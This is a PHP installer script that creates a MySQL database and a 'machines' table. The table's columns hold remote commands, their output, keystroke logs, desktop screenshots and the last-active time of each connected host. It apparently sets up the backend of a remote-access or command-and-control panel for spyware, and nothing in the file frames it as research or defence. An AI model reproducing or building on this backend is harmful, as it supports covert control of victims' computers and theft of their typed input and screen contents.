<?php
require('./config.php');

try {
    $conn = new mysqli($DB_SERVERNAME, $DB_USERNAME, $DB_PASSWORD);
    $create_db_query = "CREATE DATABASE IF NOT EXISTS {$DB_NAME}";
    
    if ($conn->query($create_db_query) === TRUE) {
        echo "DB Created";
    } else {
        echo "Database already exists or other error.";
    }
} catch (mysqli_sql_exception $e) {
    echo "Database creation failed: " . $e->getMessage();
}

$conn->select_db($DB_NAME);

try {
    $create_table_query = "
        CREATE TABLE IF NOT EXISTS machines (
            id INT AUTO_INCREMENT PRIMARY KEY,
            name VARCHAR(255) NOT NULL,
            ip VARCHAR(50) NOT NULL,
            command TEXT,
            output TEXT,
            keylog TEXT,
            desktop LONGBLOB,
            last_active DATETIME DEFAULT CURRENT_TIMESTAMP
        )";

    if ($conn->query($create_table_query) === TRUE) {
        echo "Table 'machines' created successfully or already exists.";
    } else {
        echo "Error creating table: " . $conn->error;
    }
} catch (mysqli_sql_exception $e) {
    echo "Table creation failed: " . $e->getMessage();
}

$conn->close();